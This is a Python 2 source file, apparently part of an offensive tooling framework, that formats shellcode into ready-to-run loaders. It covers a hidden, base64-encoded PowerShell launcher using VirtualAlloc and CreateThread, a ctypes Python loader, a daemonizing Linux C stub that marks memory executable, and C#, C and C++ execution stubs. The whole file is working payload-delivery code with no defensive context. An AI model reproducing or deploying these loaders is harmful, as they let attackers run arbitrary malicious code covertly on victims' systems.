#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import binascii as b
import textwrap

def format_ps(payload):
	'''Windows Powershell script'''
	formatted_payload = ','.join(['0x'+b.hexlify(op) for op in payload])
	powershell = '''function Generate-ShellcodeExec
{
$shellcode_string = @"
`$code = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';`$winFunc = Add-Type -memberDefinition `$code -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]`$sc64 = %s
;[Byte[]]`$sc = `$sc64;`$size = 0x1000;if (`$sc.Length -gt 0x1000) {`$size = `$sc.Length};`$x=`$winFunc::VirtualAlloc(0,0x1000,`$size,0x40);for (`$i=0;`$i -le (`$sc.Length-1);`$i++) {`$winFunc::memset([IntPtr](`$x.ToInt32()+`$i), `$sc[`$i], 1)};`$winFunc::CreateThread(0,0,`$x,0,0,0);for (;;) { Start-sleep 60 };
"@
$goat =  [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($shellcode_string)) 
write-output $goat
}		function Execute-x86
{
    if($env:PROCESSOR_ARCHITECTURE -eq "AMD64")
    {
        $powershellx86 = $env:SystemRoot + "syswow64WindowsPowerShellv1.0powershell.exe"
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		$thegoat = Generate-ShellcodeExec
        iex "& $powershellx86 $cmd $thegoat"
		
    }
    else
    {
        $thegoat = Generate-ShellcodeExec
		$cmd = "-noprofile -windowstyle hidden -noninteractive -EncodedCommand"
		iex "& powershell $cmd $thegoat"
    }
}
Execute-x86''' % formatted_payload
	return powershell


def format_hex(payload):
	'''Hex escaped bytes'''
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	return '\n'.join(textwrap.wrap(formatted_payload, 32))



def format_win_py(payload):
	'''Windows Python wrapper''' 
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	py = '''#!/usr/bin/python2.7
import ctypes
shellcode = bytearray('%s')
 
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
              ctypes.c_int(len(shellcode)),
              ctypes.c_int(0x3000),
              ctypes.c_int(0x40))
 
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
              buf,
              ctypes.c_int(len(shellcode)))
 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
              ctypes.c_int(0),
              ctypes.c_int(ptr),
              ctypes.c_int(0),
              ctypes.c_int(0),
              ctypes.pointer(ctypes.c_int(0)))
 
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))''' % formatted_payload
	return py

def format_lin_c(payload):
	'''Linux C wrapper'''
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	c = '''#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
unsigned char buf[] = "%s";
 
#define EXIT_SUCCESS 0
#define EXIT_FAILURE 1
 
static void daemonize(void)
{
    pid_t pid, sid;
    if ( getppid() == 1 ) return;
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    umask(0);
    sid = setsid();
    if (sid < 0) {
        exit(EXIT_FAILURE);
    }
 	if ((chdir("/")) < 0) {
        exit(EXIT_FAILURE);
    }
 
    freopen( "/dev/null", "r", stdin);
    freopen( "/dev/null", "w", stdout);
    freopen( "/dev/null", "w", stderr);
}
void main(int argc, char**argv)
{
    daemonize();
    void *addr = (void*)((unsigned long)buf & ((0UL - 1UL) ^ 0xfff));/*get memory page*/
    int ans = mprotect(addr, 1, PROT_READ|PROT_WRITE|PROT_EXEC);/*set page attributes*/
    if (ans)
    {
        exit(EXIT_FAILURE);
    }
    ((void(*)(void))buf)();/*execute array*/
}''' % formatted_payload
	return c

def format_win_c(payload):
	'''Windows C wrapper'''
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	c = '''char code[] = "%s";
int main(int argc, char **argv)
{
   int (*func)();
   func = (int (*)()) code;
   (int)(*func)();
}''' % formatted_payload
	return c

def format_csharp(payload):
	'''C# wrapper'''
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	csharp = '''using System;
using System.Runtime.InteropServices;
using Mono.Unix.Native;		
class MainClass
{
    private static String shellcode = "%s";		
    private static Int32 PAGE_SIZE = 
        (Int32)Mono.Unix.Native.Syscall.sysconf(SysconfName._SC_PAGESIZE);		
    private static void Main(string[] args)
    {
        ExecShellcode();
    }		
    private static IntPtr GetPageBaseAddress(IntPtr p)
    {
        return (IntPtr)((Int32)p & ~(PAGE_SIZE - 1));
    }		
    private static void MakeMemoryExecutable(IntPtr pagePtr)
    {
        var mprotectResult = Syscall.mprotect (pagePtr, (ulong)PAGE_SIZE, 
            MmapProts.PROT_EXEC | MmapProts.PROT_WRITE);		
        if (mprotectResult != 0) 
        {
            Console.WriteLine ("Error: mprotect failed to make page at 0x{0} " +
                "address executable! Result: {1}, Errno: {2}", mprotectResult, 
                Syscall.GetLastError ());
            Environment.Exit (1);
        }
    }		
    private delegate void ShellcodeFuncPrototype();		
    private static void ExecShellcode()
    {
        // Convert shellcode string to byte array
        Byte[] sc_bytes = new Byte[shellcode.Length];
        for (int i = 0; i < shellcode.Length; i++) 
        {
            sc_bytes [i] = (Byte) shellcode [i];
        }		
        // Prevent garbage collector from moving the shellcode byte array
        GCHandle pinnedByteArray = GCHandle.Alloc(sc_bytes, GCHandleType.Pinned);		
        // Get handle for shellcode address and address of the page it is located in
        IntPtr shellcodePtr = pinnedByteArray.AddrOfPinnedObject();
        IntPtr shellcodePagePtr = GetPageBaseAddress(shellcodePtr);
        Int32 shellcodeOffset = (Int32)shellcodePtr - (Int32)shellcodePagePtr;
        Int32 shellcodeLen = sc_bytes.GetLength (0);		
        // Some debugging information
        Console.WriteLine ("Page Size: {0}", PAGE_SIZE.ToString ());
        Console.WriteLine ("Shellcode address: 0x{0}", shellcodePtr.ToString("x"));
        Console.WriteLine ("First page start address: 0x{0}", 
            shellcodePagePtr.ToString("x"));
        Console.WriteLine ("Shellcode offset: {0}", shellcodeOffset);
        Console.WriteLine ("Shellcode length: {0}", shellcodeLen);		
        // Make shellcode memory executable
        MakeMemoryExecutable(shellcodePagePtr);		
        // Check if shellcode spans across more than 1 page; make all extra pages
        // executable too
        Int32 pageCounter = 1;
        while (shellcodeOffset + shellcodeLen > PAGE_SIZE) 
        {
            shellcodePagePtr = 
                GetPageBaseAddress(shellcodePtr + pageCounter * PAGE_SIZE);
            pageCounter++;
            shellcodeLen -= PAGE_SIZE;		
            MakeMemoryExecutable(shellcodePagePtr);
        }		
        // Debug information
        Console.WriteLine ("Pages taken by the shellcode: {0}",
            pageCounter);		
        // Make shellcode callable by converting pointer to delegate
        ShellcodeFuncPrototype shellcode_func = 
            (ShellcodeFuncPrototype) Marshal.GetDelegateForFunctionPointer(
                shellcodePtr, typeof(ShellcodeFuncPrototype));		
        shellcode_func(); // Execute shellcode		
        pinnedByteArray.Free();
    }
}''' % formatted_payload
	return csharp

def format_win_cpp(payload):
	'''Windows C++ wrapper'''
	formatted_payload = ''.join(['\\x'+b.hexlify(op) for op in payload])
	cpp = '''int main(){
unsigned char b[] = "%s";
void *exec = VirtualAlloc(0, sizeof b, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(exec, b, sizeof b);
((void(*)())exec)();
}''' % formatted_payload
	return cpp

def format_raw(payload):
	'''Raw ASCII payload'''
	return payload

def format_bytes(payload):
    '''Pure, non-escaped bytestring'''
    return ''.join([b.hexlify(op) for op in payload])







